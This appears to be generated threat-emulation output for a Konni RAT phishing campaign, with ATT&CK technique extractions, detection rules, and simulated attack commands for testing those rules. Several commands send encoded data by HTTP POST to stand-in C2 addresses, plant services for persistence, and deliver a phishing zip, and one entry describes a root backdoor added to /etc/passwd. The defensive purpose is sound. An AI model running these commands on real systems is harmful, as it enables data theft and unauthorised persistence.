extracted_ttps.description: The attacker used phishing as the initial access phase, exploiting the holiday time of year as bait.
The attacker used a command and scripting interpreter to execute commands, specifically a bat file to install Konni RAT as a service.
The attacker relied on user execution to install Konni RAT, using a bat file to automate the process.
The attacker created or modified system processes to maintain persistence, specifically installing Konni RAT as a service.
The attacker performed process discovery to gather information about running processes on the target system.
The attacker used an application layer protocol for command and control, possibly HTTP or HTTPS.
The attacker performed system owner/user discovery to gather information about the target system's owners or users.
The attacker used system services to maintain persistence, installing Konni RAT as a service.
The attacker manipulated access tokens to escalate privileges, although the specific method is not mentioned.
The attacker relied on the user to open and execute the malicious email attachment.
The attacker performed system information discovery to gather information about the target system.
The attacker performed screen capture to collect sensitive information from the target system.
The attacker collected system information, including operating system and computer name.
The attacker used automated collection to gather information from the target system.
The attacker used data encoding to exfiltrate data from the target system.
The attacker archived collected data, possibly for exfiltration or further analysis.
The attacker used cmd.exe to execute commands and scripts.
The attacker exfiltrated data over the command and control channel.
The attacker sent a spear phishing email with a malicious zip file attachment to infect the target.
Detected Create or Modify System Process activity via NLP pattern matching
The attacker used remote services to communicate with the command and control server.
Detected Phishing activity via NLP pattern matching
The attacker collected data from the local system, including cached website information.
Detected Application Layer Protocol activity via NLP pattern matching
Detected Command and Scripting Interpreter activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
The attacker used automated exfiltration to transfer data from the target system.
The attacker installed a new Windows service to maintain persistence.
Detected Archive Collected Data activity via NLP pattern matching
Detected Screen Capture activity via NLP pattern matching
The attacker used WMI to enumerate system information.
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Account Discovery activity via NLP pattern matching
Detected Registry Run Keys activity via NLP pattern matching

rules.title: Suspicious Office Application Spawning Command Shell - Holiday Phishing Indicator
rules.description: Detects Office applications spawning command shells, which may indicate execution of malicious code from a phishing document, particularly during holiday periods where social engineering is more effective.
falsepositives: Legitimate document automation tools that spawn command-line processes
Administrative scripts launched from Office applications (rare)
User-initiated command execution from within Office (e.g., via macro for valid purpose)

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Command and Scripting Interpreter - Bat File Execution
rules.description: Detects the execution of a bat file using cmd.exe, which may indicate the installation of Konni RAT as a service
falsepositives: Legitimate system administration tasks
Batch scripts run by system administrators

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Batch File Execution Leading to Potential Konni RAT Installation
rules.description: Detects execution of batch files that may be used to install Konni RAT via user-driven execution, focusing on command-line tools commonly abused in payload delivery.

detection.condition: selection and not exclusion_parent_system and not exclusion_user_system

falsepositives: Legitimate batch scripts used for software installation or system administration executed by users
Development or testing environments where batch files invoke PowerShell or downloaders for legitimate purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Create or Modify System Process to Install Konni RAT
rules.description: Detects the creation or modification of system processes to install Konni RAT, which is used by attackers to maintain persistence
falsepositives: Legitimate system processes that contain the string 'Konni RAT' in their command line
Processes created by system administrators for maintenance or troubleshooting purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Process Discovery via Suspicious Process Creation
rules.description: Detects process discovery techniques by identifying suspicious process creation patterns, where an attacker may use system utilities to gather information about running processes on the target system.
falsepositives: Legitimate system administration tasks
Security software scans

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

falsepositives: Legitimate web browsing activity
Connections to internal web servers

rules.title: System Owner/User Discovery

rules.title: Screen Capture via Command Line or Script

rules.title: Automated Collection via Command-Line Tools

falsepositives: Legitimate administrative scripts performing recursive file searches

User-initiated directory traversals in command prompt

rules.title: Suspicious Data Encoding Command Line Activity
rules.description: Detects use of common encoding/decoding utilities in command lines which may indicate data encoding for exfiltration purposes.
falsepositives: Administrative scripts using base64 encoding or certutil for legitimate file transfers
Software installers or update mechanisms using encoded payloads internally
Penetration testing or red team activities involving data staging

rules.title: Suspicious Data Archiving Activity
rules.description: Detects potential archiving of collected data by monitoring for execution of archiving tools with suspicious command-line arguments indicative of bulk data packaging.

detection.condition: selection_tools and selection_cli_keywords and not exclusion_anomalous_path

falsepositives: Legitimate backup or deployment scripts that use archiving tools in automated workflows
Software installation routines that package logs or configuration files
User-initiated compression of files for sharing or storage

Use of command line flags for non-malicious purposes

rules.title: Spearphishing Attachment with поздравление.zip
rules.description: Detects creation of a file named поздравление.zip, commonly used in spearphishing campaigns as a malicious attachment. This rule targets file creation events associated with such payloads.
falsepositives: Legitimate use of a file named поздравление.zip (e.g., genuine congratulatory message in Cyrillic)
Users in Russian or Cyrillic-speaking regions exchanging ZIP files with similar names

siem_verification.message: Verification complete

rules.title: Suspicious Network Connection to Known C2 Server - Remote Services
rules.description: Detects network connections to a known command and control server associated with the Remote Services lateral movement technique. The rule identifies traffic to specific malicious URLs used for uploading and downloading data.
falsepositives: Legitimate software using similar domain patterns for update/download functionality (unlikely due to domain specificity)
Test traffic from security tools or red team exercises using the same IOCs

siem_verification.message: Verification complete

rules.title: Potential Enumeration of Local Web Cache Using Windows API
rules.description: Detects potential use of Windows API functions FindFirstUrlCacheEntryW and FindNextUrlCacheEntryW for enumerating local web cache entries, which may indicate data collection from the local system.
falsepositives: Legitimate administrative scripts that interact with browser cache for diagnostics or cleanup.
Software update tools or system utilities that check cached web content.
User-initiated actions using scripting hosts for web-related tasks.

falsepositives: Legitimate system administration activities, such as installing new services for system updates or software installations.

rules.title: Obfuscated Files or Information via Command Line Obfuscation
rules.description: Detects potential obfuscation techniques in command line arguments, such as encoded PowerShell, base64-encoded payloads, or use of encoding utilities like certutil and debug.exe.

detection.condition: selection_powerhell_enc or selection_base64_long or selection_certutil_decode or selection_debug_script or selection_cmd_echo_long

falsepositives: Legitimate administrative scripts using encoded commands for automation
Software deployment tools using certutil or debug.exe for legitimate file extraction
PowerShell scripts with long but legitimate command lines

rules.title: Suspicious Process Creation from Public-Facing Application
rules.description: Detects potential exploitation of public-facing applications by identifying server processes spawning command shells with suspicious command lines, which may indicate successful code execution via a vulnerability.
falsepositives: Legitimate administrative command execution from within a web application (e.g., diagnostics, maintenance scripts)
Automated deployment or configuration management tools executing commands via web interfaces

attacks.description: Downloads a benign file from a URL to the temp directory, simulating a phishing attack that might download malware.
attacks.expected_behavior: A file named benignfile.txt will be downloaded to the user's temp directory.

attacks.description: Uses certutil to download a file, demonstrating an alternative method a phishing attack might use to fetch malicious content.
attacks.expected_behavior: A file named benignfile.txt will be downloaded to the user's temp directory using certutil.

attacks.description: Opens a URL in Internet Explorer, simulating a phishing attack that directs the victim to a malicious website.
attacks.expected_behavior: Internet Explorer will open and navigate to the specified URL.

attacks.command: echo 'Please enter your password: ' && read -r password && echo 'Password accepted!' > /dev/null
attacks.description: Basic phishing command that prompts the user to enter their password
attacks.expected_behavior: The command will prompt the user to enter their password and then accept it without actually using it for any malicious purpose.

attacks.description: Intermediate phishing command that downloads and executes a malicious script
attacks.expected_behavior: The command will download a script from a remote location and execute it on the local system. Note: This command assumes internet access and should be used with caution.

attacks.command: sudo bash -c 'echo "Malicious command executed as root" > /etc/motd'
attacks.description: Advanced phishing command that uses social engineering to trick the user into executing a malicious command with elevated privileges
attacks.expected_behavior: The command will prompt the user to enter their password to execute a malicious command with elevated privileges. Note: This command requires admin privileges and should be used with extreme caution.

attacks.command: net start > %TEMP%\service_list.txt && sc.exe create TestService binPath= "C:\\Path\\To\\MaliciousService.exe" && net start TestService
attacks.description: Basic command to create and start a new service using net.exe and sc.exe, writing service list to a temp file.
attacks.expected_behavior: Creates a new service and starts it, listing all services to a temp file.

attacks.description: Intermediate command using PowerShell to create a new service, ensuring proper quoting and escaping.
attacks.expected_behavior: Creates a new service using PowerShell, demonstrating command and scripting interpreter technique.

attacks.command: cmd.exe /c "echo @echo off > %TEMP%\\startup.bat && echo sc.exe create TestService binPath= C:\\Path\\To\\MaliciousService.exe >> %TEMP%\\startup.bat && echo net start TestService >> %TEMP%\\startup.bat && %TEMP%\\startup.bat"
attacks.description: Advanced command creating a bat file in temp, writing commands to create and start a service, then executing the bat file.
attacks.expected_behavior: Creates and executes a bat file from the temp directory, installing and starting a malicious service.

attacks.description: Basic command execution using bash to write a test string to a file
attacks.expected_behavior: Creates a file named test.txt in /tmp with the content 'Hello World'

attacks.description: Intermediate command execution creating a directory and writing to a file within it
attacks.expected_behavior: Creates a directory named testdir in /tmp and a file named test.txt within it with the content 'Test Directory'

attacks.command: sudo bash -c 'echo "Test Service" > /etc/systemd/system/test.service; systemctl daemon-reload; systemctl start test.service'
attacks.description: Advanced command execution creating and starting a systemd service (requires admin privileges)
attacks.expected_behavior: Creates a systemd service file, reloads the daemon, and starts the service. Note: This command is potentially destructive and should be used with caution in a testing environment.

attacks.description: Creates a VBScript file in the temp directory that displays a message box when executed.
attacks.expected_behavior: A message box will pop up displaying 'Hello World'.

attacks.description: Executes a PowerShell command that displays a message box.
attacks.expected_behavior: A message box will pop up displaying 'Hello World'.

attacks.description: Decodes a benign string using certutil and displays the output.
attacks.expected_behavior: The decoded string will be displayed in the command prompt.

attacks.description: Basic user execution via shell script: creates a benign script, makes it executable, and runs it.
attacks.expected_behavior: Creates a script in the user's home directory, sets execute permission, and runs it. Outputs a test message to simulate payload execution.

attacks.description: Intermediate: executes a base64-encoded benign command via piped bash execution, simulating obfuscated payload delivery.
attacks.expected_behavior: Decodes and executes a base64-encoded command that prints a test message. Simulates execution of encoded payloads without actual malware.

attacks.command: export PAYLOAD='$(echo "echo Simulated Konni RAT activation" | base64 -d)'; bash -c "$PAYLOAD"
attacks.description: Advanced: uses environment variable to store decoded payload and executes it, demonstrating obfuscation and indirect execution.
attacks.expected_behavior: Sets an environment variable with a decoded command string and executes it via bash, simulating advanced evasion techniques.

attacks.command: sc.exe create TestService binPath= "%windir%\system32\cmd.exe /c echo TestKonniService > %TEMP%\svc_test.txt" start= auto
attacks.description: Creates a Windows service using sc.exe with a command that writes a test string to a file in %TEMP%.
attacks.expected_behavior: A service named 'TestService' is created and set to start automatically. On service start, it runs cmd.exe to write 'TestKonniService' to %TEMP%\svc_test.txt.

attacks.command: reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\TestRegSvc" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c echo RegSvcTest > %TEMP%\regsvc_test.txt" /f && reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\TestRegSvc" /v Start /t REG_DWORD /d 2 /f
attacks.description: Creates a registry-based service by manually adding service keys under CurrentControlSet.
attacks.expected_behavior: A new service entry 'TestRegSvc' is added to the registry with auto-start (Start=2). Upon system boot or service start, it writes 'RegSvcTest' to %TEMP%\regsvc_test.txt.

attacks.command: powershell -Command "try { $cmd = 'cmd.exe /c echo PowerShellSvcTest > %TEMP%\\pssvc_test.txt'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); $svcName = 'TestEncodedSvc'; $binPath = "powershell.exe -EncodedCommand $encoded"; Start-Process -FilePath sc.exe -ArgumentList 'create', $svcName, 'binPath=', "`"$binPath`"", 'start=', 'auto' -Wait } catch { }"
attacks.description: Creates a service using PowerShell with an encoded command that writes a test string to a file.
attacks.expected_behavior: A service named 'TestEncodedSvc' is created via sc.exe launched from PowerShell. The service runs a Base64-encoded PowerShell command that executes cmd to write 'PowerShellSvcTest' to %TEMP%\pssvc_test.txt on start.

attacks.command:
sudo sh -c 'echo "[Unit]
Description=Konni Persistence Service
[Service]
ExecStart=/bin/sleep infinity
Restart=always
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/konni.service && systemctl daemon-reload && systemctl enable konni.service && systemctl start konni.service'
attacks.description: Creates a systemd service file for persistence using a benign command
attacks.expected_behavior: A new service named 'konni.service' is created, enabled to start at boot, and immediately started. It runs /bin/sleep infinity and restarts on failure.

attacks.command: sudo systemctl set-property konni.service ExecStart=/bin/true RestartSec=5
attacks.description: Modifies an existing service to change its behavior and restart interval
attacks.expected_behavior: The 'konni.service' is reconfigured to run /bin/true with a 5-second delay on restart, demonstrating modification of system process behavior.

attacks.command: sudo sh -c 'echo "#!/bin/sh\nexec /bin/sleep infinity" > /etc/init.d/konni && chmod +x /etc/init.d/konni && update-rc.d konni defaults'
attacks.description: Installs a legacy init script for persistence on systems using SysVinit
attacks.expected_behavior: A new init script 'konni' is created, made executable, and registered to start at boot via SysVinit mechanisms.

attacks.description: Lists all running processes using the legacy tasklist binary.
attacks.expected_behavior: Outputs a list of currently running processes including Image Name, PID, Session Name, Session#, and Memory Usage to stdout.

attacks.description: Queries detailed process information using Windows Management Instrumentation Command-line (WMIC).
attacks.expected_behavior: Displays Name, Process ID, Executable Path, and Command Line arguments for each running process. May include more detailed information than tasklist, such as launch commands.

attacks.description: Uses PowerShell to retrieve and format detailed process information via WMI.
attacks.expected_behavior: Executes a PowerShell command that queries Win32_Process class, selects key process attributes, and formats output in a table. Provides visibility into running processes similar to WMIC but using PowerShell cmdlets.

attacks.description: List all running processes with detailed information including user, PID, CPU, and command line.
attacks.expected_behavior: Outputs a list of all running processes with full details to stdout. No system changes are made.

attacks.description: Search for running processes matching the name 'firefox' and display their PIDs and full command lines.
attacks.expected_behavior: Outputs the PID and command line of any running 'firefox' processes. Returns no output if none are found.

attacks.description: List the first 20 running processes with custom columns: PID, PPID, UID, GID, and command, without headers for script parsing.
attacks.expected_behavior: Outputs 20 lines of process data in a structured format suitable for parsing. No system modifications occur.

attacks.description: Downloads a file from a specified HTTP URL to the temp directory using PowerShell.
attacks.expected_behavior: A file named test.txt will be downloaded from the specified URL and saved to the temp directory.

attacks.description: Uses certutil to download a file from a specified HTTP URL.
attacks.expected_behavior: The file will be downloaded from the specified URL and saved locally with the name fetch.

attacks.description: Sends an HTTPS request to a specified URL using PowerShell.
attacks.expected_behavior: The command will send a request to the specified HTTPS URL and retrieve the response.

attacks.command: curl -s -X GET 'http://192.0.2.1:8080/beacon' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
attacks.description: Basic HTTP GET request to simulate beaconing to a C2 server using curl
attacks.expected_behavior: Sends a silent HTTP GET request to the specified URL with a spoofed User-Agent string. No data is exfiltrated or retrieved; used to simulate periodic beaconing behavior.

attacks.description: Intermediate command to simulate data exfiltration over HTTPS using curl with piped input
attacks.expected_behavior: Pipes a test string into an HTTPS POST request to simulate sending small amounts of data to a C2 server. Uses standard input (@-) to avoid file creation. Connection is made over TLS, mimicking encrypted C2 traffic.

attacks.description: Advanced command to simulate downloading and executing a shell script over HTTP
attacks.expected_behavior: Fetches a script from a remote server and pipes it directly into bash for execution. In a real attack, this could deliver a payload. Here, the server returns nothing or benign content. stderr is suppressed to mimic stealthy behavior. This is marked medium risk due to execution capability, but no actual payload is involved.

attacks.description: Lists all local user accounts on the system using the legacy net.exe binary.
attacks.expected_behavior: Outputs a list of local user accounts to the console.

attacks.description: Displays all user-related information including user name, SID, group memberships, and privileges.
attacks.expected_behavior: Prints detailed user and group information for the current user to stdout.

attacks.description: Queries detailed user account information across the system using WMI command-line interface.
attacks.expected_behavior: Outputs a table of user accounts with attributes such as Name, Domain, SID, and account status flags.

attacks.description: Display the current user's username
attacks.expected_behavior: Outputs the username of the currently logged-in user

attacks.description: Display current user's ID and group memberships, then list all user accounts on the system
attacks.expected_behavior: Prints detailed user and group info for the current session, followed by a sorted list of all usernames from the system password file

attacks.description: List all non-system (regular) user accounts with their UID and home directory using getent for accurate name service lookups
attacks.expected_behavior: Outputs username, UID, and home directory path for regular user accounts, useful for identifying interactive users on the system

attacks.command: sc.exe create BadService binPath= "cmd.exe /c echo Hello from service > %TEMP%\service_log.txt" start= auto
attacks.description: Creates a Windows service named 'BadService' that runs a benign command on startup.
attacks.expected_behavior: Service 'BadService' is created and set to start automatically. Upon system boot or manual start, it writes a message to a log file in %TEMP%.

attacks.command: sc.exe create PersistenceService binPath= "rundll32.exe user32.dll,LockWorkStation" start= delayed
attacks.description: Creates a service with delayed start that runs a harmless system function.
attacks.expected_behavior: Service 'PersistenceService' is created and set to start automatically with a delay. It locks the workstation when started, simulating persistence behavior without damage.

attacks.command: powershell -Command "try { $cmd = 'sc.exe create EncodedService binPath= ""cmd.exe /c echo encoded service > %TEMP%\encoded_service.txt"" start= auto'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden } catch { }"
attacks.description: Executes a base64-encoded command to create a persistent service using PowerShell.
attacks.expected_behavior: PowerShell decodes and executes a command that creates a service named 'EncodedService'. The service logs a message on start. The use of encoding simulates obfuscated malware installation.

attacks.description: Create a new systemd service interactively named 'konni-persistence' using the default editor. This is a basic method to define a custom service for persistence.
attacks.expected_behavior: Opens a text editor (based on $EDITOR or system default) to define the service unit. The user would manually enter service configuration. No immediate execution occurs until saved and enabled.

attacks.command:
printf '[Unit]
Description=Konni RAT Service
After=network.target

[Service]
Type=simple
User=$USER
ExecStart=/bin/bash -c "while true; do echo "[INFO] Heartbeat" >> /tmp/konni.log; sleep 60; done"
Restart=always

[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/konni-persistence.service
attacks.description: Write a systemd service unit file for a persistent fake Konni RAT using printf and tee. This is an intermediate method that avoids interactive editing.
attacks.expected_behavior: Creates a service unit file at /etc/systemd/system/konni-persistence.service that logs a heartbeat every 60 seconds. The service is not started until explicitly enabled and started with systemctl.

attacks.command:
sudo bash -c 'echo "[Unit]
Description=Konni Encoded RAT
After=network.target

[Service]
Type=simple
User=$USER
ExecStart=/bin/bash -c "bash -c $(echo -n YmFzaCAtYyAiZXhlYyAveHl6IiAmIHdoaWxlICR7I307IGRvIHNsZWVwIDEwOyBkb25l" | base64 -d)"
Restart=always

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/konni-encoded.service && systemctl daemon-reload && systemctl enable --now konni-encoded.service'
attacks.description: Create a systemd service with an encoded ExecStart command to simulate obfuscated payload delivery (base64-encoded benign loop). Advanced technique using inline encoding.
attacks.expected_behavior: Writes a service unit file with a base64-decoded command that runs a harmless loop. The service is reloaded, enabled, and started immediately. Logs or behavior depend on the decoded command (benign in this case).

attacks.description: Enumerate current user's privileges and group memberships to identify token manipulation opportunities.
attacks.expected_behavior: Lists current user's group tokens and privileges. No privilege escalation occurs, but it's a precursor step for token manipulation.

attacks.description: Launch whoami with elevated privileges using PowerShell's RunAs verb to simulate access token reuse in a new process.
attacks.expected_behavior: Prompts for elevation (UAC) if not already admin; upon approval, runs whoami /priv in a new process with elevated token. Demonstrates token inheritance and elevation via user interaction.

attacks.command: cmd.exe /c "echo. > "%TEMP%\token_test" && powershell -Command "Start-Process cmd -ArgumentList '/c echo Success > %TEMP%\token_success.txt' -Verb RunAs -WindowStyle Hidden" -ErrorAction SilentlyContinue
attacks.description: Create a test file and spawn a hidden elevated command shell to write a second file, simulating post-token-manipulation execution.
attacks.expected_behavior: Creates a marker file in %TEMP%, then attempts to launch an elevated hidden cmd to create a second file. If approved via UAC, the second file will be created under elevated context. If denied, only the first file exists. Error handling ensures no crash on failure.

attacks.description: Basic user impersonation using su with a known password to gain access to another user's session.
attacks.expected_behavior: Attempts to run 'whoami' as user 'john' using a password provided via stdin. Succeeds if password is correct and su is permitted.

attacks.description: Exploits sudo token caching by validating and then reusing elevated privileges with credentials read from a file.
attacks.expected_behavior: First updates the sudo timestamp; then attempts to run 'whoami' as root using credentials from /tmp/stolen_creds.txt. Simulates reuse of cached access tokens.

attacks.description: Advanced method of privilege escalation by modifying /etc/passwd to insert a backdoored entry with UID 0, simulating token impersonation via account creation.
attacks.expected_behavior: Backs up /etc/passwd, appends a new root-equivalent user, and restores it system-wide. This allows login as 'eviluser' with root privileges. Destructive if not reverted.

attacks.description: Basic system information discovery using built-in systeminfo command
attacks.expected_behavior: Outputs detailed system information including OS version, architecture, hotfixes, and network configuration to stdout

attacks.command: cmd.exe /c "hostname & whoami & ipconfig /all & net config workstation"
attacks.description: Intermediate information gathering using multiple built-in commands in a single line
attacks.expected_behavior: Outputs hostname, current user context, network configuration, and workstation settings to stdout

attacks.command: powershell -Command "try { $sys = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop; $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop; $proc = Get-CimInstance -ClassName Win32_Processor -ErrorAction Stop; ConvertTo-Json -InputObject @{ ComputerName = $sys.Name; Domain = $sys.Domain; TotalMemoryMB = [math]::Round($sys.TotalPhysicalMemory / 1MB); OS = $os.Caption; OSArchitecture = $os.OSArchitecture; CPU = $proc.Name } } catch { Write-Error $_.Exception.Message }"
attacks.description: Advanced system information discovery using PowerShell CIM commands for structured output
attacks.expected_behavior: Retrieves system, OS, and processor information via WMI and outputs it as a JSON object; falls back to error message if access is denied

attacks.description: Basic system information discovery using uname to retrieve kernel and system version.
attacks.expected_behavior: Outputs kernel name, version, hostname, and architecture to stdout.

attacks.command: sh -c 'echo "[System Info]"; cat /etc/os-release 2>/dev/null || echo "os-release not found"; echo "[Network Interfaces]"; ip link show; echo "[Mounted Filesystems]"; mount | grep -E "(ext|ntfs|xfs)"'
attacks.description: Intermediate system discovery combining OS, network, and filesystem information using common shell commands.
attacks.expected_behavior: Prints OS details, network interfaces, and mounted filesystems. Uses redirection to suppress errors if /etc/os-release is missing.

attacks.command: sudo dmidecode -t system; lsb_release -a; cat /proc/cpuinfo | head -10
attacks.description: Advanced system discovery using dmidecode (requires root) to get hardware details, along with OS distribution and CPU info.
attacks.expected_behavior: Outputs system manufacturer, product name, serial number from DMI, Linux distribution info, and partial CPU details. dmidecode fails without root.

attacks.description: Captures the screen and saves it as a PNG file in the TEMP directory using PowerShell.
attacks.expected_behavior: A screenshot of the current screen is saved as a PNG file in the user's TEMP directory.

attacks.command: powershell -Command "$signature = @' [DllImport("user32.dll")] public static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, uint nFlags); '@; Add-Type -MemberDefinition $signature -Name APISetup -PassThru | Out-Null; [APISetup]::PrintWindow((Get-Process -Id $PID).MainWindowHandle, [System.IntPtr]::Zero, 0);"
attacks.description: An intermediate example using P/Invoke to capture the window of the current PowerShell process.
attacks.expected_behavior: The window of the current PowerShell process is captured and sent to the printer.

attacks.description: A basic example attempting to print the screen to a file. Note: This command might not directly capture the screen as intended but demonstrates an attempt to redirect output.
attacks.expected_behavior: Attempts to print the screen to a file named screenshot.png in the TEMP directory, though the actual outcome may vary based on the system's print settings.

attacks.description: Take a full-screen screenshot using gnome-screenshot and save it to /tmp/screenshot.png
attacks.expected_behavior: Captures the entire screen and saves the image as PNG in /tmp. No output to terminal.

attacks.description: Capture the root window after a 2-second delay using ImageMagick's import tool
attacks.expected_behavior: Waits 2 seconds (2,000,000 microseconds) then captures the screen and saves as JPG in /tmp.

attacks.description: Use scrot to capture the screen, save it, and display the first 100 characters of base64-encoded output
attacks.expected_behavior: Takes a screenshot, saves it locally, and prints a partial base64 snippet to simulate exfiltration prep.

attacks.description: Gathers network configuration information and saves it to a file in the temp directory.
attacks.expected_behavior: The command executes without prompting the user, saving network configuration details to a file named system_info.txt in the temp directory.

attacks.description: Uses PowerShell to gather detailed information about the operating system and saves it to a file.
attacks.expected_behavior: The command executes, gathering OS information and saving it to a file named os_info.txt in the temp directory without requiring admin privileges.

attacks.description: Collects user and group information and saves it to a file in the temp directory.
attacks.expected_behavior: The command runs, saving user and group details to a file named user_info.txt in the temp directory.

attacks.description: Finds common document files in user directories and logs their paths for later collection.
attacks.expected_behavior: Generates a list of up to 50 text, PDF, or Word-like files from /home directories, ignoring permission errors. Output saved to $HOME/collected_files.txt.

attacks.description: Creates a compressed archive and conditionally adds sensitive system files if accessible.
attacks.expected_behavior: Initializes an empty tar.gz archive and attempts to append /etc/passwd and /etc/group. Fails silently if files are inaccessible.

attacks.description: Basic example of encoding a string using PowerShell's ConvertTo-Base64String cmdlet.
attacks.expected_behavior: Encodes the string 'Hello World' to Base64 and saves it to a file named encoded.txt in the temporary directory.

attacks.description: Intermediate example using certutil.exe to encode a file and then display the encoded content.
attacks.expected_behavior: Creates a file test.txt in the temporary directory, encodes its content using certutil.exe, saves the encoded data to encoded.txt, and then displays the content of the encoded file.

attacks.command: powershell -Command "'This is a secret message' | ConvertTo-Base64String | Set-Content -Path $env:TEMP\secret-encoded.txt -Force; Get-Content -Path $env:TEMP\secret-encoded.txt | ConvertFrom-Base64String"
attacks.description: Advanced example demonstrating both encoding and decoding of a secret message using PowerShell.
attacks.expected_behavior: Encodes a secret message to Base64, saves it to a file, and then reads and decodes the file content back to the original message, demonstrating the full cycle of data encoding and decoding.

attacks.description: Encode a test file using base64 to simulate data encoding for exfiltration.
attacks.expected_behavior: Creates a small test file and outputs its base64-encoded content to stdout. No network activity occurs. Safe for testing.

attacks.description: Compress and encode a file into a base64-encoded tarball to simulate preparation for exfiltration.
attacks.expected_behavior: Creates a gzipped tar archive of the specified file, encodes it in base64, and saves it to a file. No system files are accessed. Minimal disk usage.

attacks.description: Encrypt and encode a file using AES-256 and base64 to simulate advanced data staging for exfiltration.
attacks.expected_behavior: Tars and compresses the file, encrypts it with a password, then base64-encodes the result. Output saved to a temporary file. Uses common tools (tar, openssl, base64). No network transmission occurs.

attacks.description: Uses built-in makecab.exe to archive a test log file into a cabinet archive.
attacks.expected_behavior: Creates a small cabinet archive (archive.cab) in the temp directory containing debug.log. makecab.exe is a legitimate Windows utility and should execute without errors.

attacks.description: Creates a discovery file and compresses it into a ZIP archive using PowerShell Compress-Archive.
attacks.expected_behavior: Generates a text file with mock discovery data and creates a compressed ZIP file named exfil.zip in temp. Uses built-in PowerShell cmdlets safely.

attacks.description: Uses built-in tar (available on Windows 10 1709+) to create a gzipped tar archive of a temporary config file.
attacks.expected_behavior: Creates a temporary config file, archives it using tar with gzip compression, and deletes the original. Silent on success. tar is a built-in Windows utility in recent versions.

attacks.description: Creates a tar archive of a specific collected file.
attacks.expected_behavior: Archives the specified file into /tmp/collected_data.tar without compression. No errors if file exists.

attacks.description: Creates a compressed tar.gz archive of all PDF files in downloads.
attacks.expected_behavior: Compresses all PDFs in the downloads directory into a single gzipped archive in /tmp. Fails silently if no PDFs exist.

attacks.description: Finds all .txt files in user home directories (excluding cache), appends to tar, then compresses with gzip.
attacks.expected_behavior: Searches for text files across home directories, archives them into a single tar file, then compresses it. Avoids deep system paths and cache folders to reduce noise and risk.

attacks.description: Basic exfiltration: create a test file and upload it using certutil.exe
attacks.expected_behavior: Creates a small test file in %TEMP% and attempts to upload it to a specified URL using certutil. The upload will fail without a real server, but the command structure mimics real exfiltration behavior.

attacks.description: Intermediate exfiltration: create data, compress into ZIP, and upload via certutil
attacks.expected_behavior: Generates a data file, compresses it into a ZIP archive using PowerShell's Compress-Archive (with -Force), then attempts to upload the archive via certutil. Simulates staging and exfiltration of compressed data.

attacks.command: powershell -Command "try { $data = 'confidential:12345'; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $url = 'http://192.168.1.100/api/log'; Invoke-WebRequest -Uri $url -Method POST -Body $encoded -Headers @{ 'Content-Type' = 'application/octet-stream' } } catch { } finally { Remove-Item %TEMP%\temp_* -ErrorAction SilentlyContinue }"
attacks.description: Advanced exfiltration: encode small data in Base64 and send via HTTP POST using PowerShell
attacks.expected_behavior: Encodes a benign string into Base64, sends it in the body of an HTTP POST request to a mock C2 endpoint. Uses error suppression and cleanup of temporary artifacts. Demonstrates encoded data exfiltration over standard protocols.

attacks.description: Basic exfiltration: creates a test file and sends it via HTTP POST to a C2 server.
attacks.expected_behavior: Creates a small test file in /tmp and uploads it to the specified endpoint using curl. Fails silently if the server is unreachable. Leaves no persistent artifacts if cleanup were enabled.

attacks.command: tar -czf /tmp/staged_data.tar.gz /tmp/sensitive_data/ 2>/dev/null || true; curl -X POST --data-binary @/tmp/staged_data.tar.gz http://192.168.1.100:8080/exfil && rm /tmp/staged_data.tar.gz || true
attacks.description: Intermediate exfiltration: compresses a directory and sends it over HTTP, then deletes the archive.
attacks.expected_behavior: Attempts to compress a directory (if it exists), uploads the archive via curl, and removes the local copy. Errors are suppressed for robustness during staging and cleanup.

attacks.command: find /tmp/logs -name '*.log' -type f -exec cat {} \; | base64 | curl -X POST -d @- http://192.168.1.100:8080/data && echo 'exfil_complete'
attacks.description: Advanced exfiltration: collects log files, base64-encodes content, and sends via HTTP POST in a single pipeline.
attacks.expected_behavior: Finds log files in /tmp/logs, concatenates and base64-encodes them, then streams the output directly to the C2 endpoint using curl. No intermediate file is written to disk, making detection harder.

attacks.command: mkdir -p $HOME/tmp && echo '#!/bin/bash\necho \"Hello\"' > $HOME/tmp/payload.sh && chmod +x $HOME/tmp/payload.sh && zip -j $HOME/tmp/malicious.zip $HOME/tmp/payload.sh && echo \"Please see attached.\" | mail -s \"Important Document\" -a $HOME/tmp/malicious.zip victim@example.com
attacks.description: Create a simple bash script, zip it, and send the ZIP as an attachment using the 'mail' command.
attacks.expected_behavior: The target receives an email titled 'Important Document' with 'malicious.zip' attached, containing the harmless script.

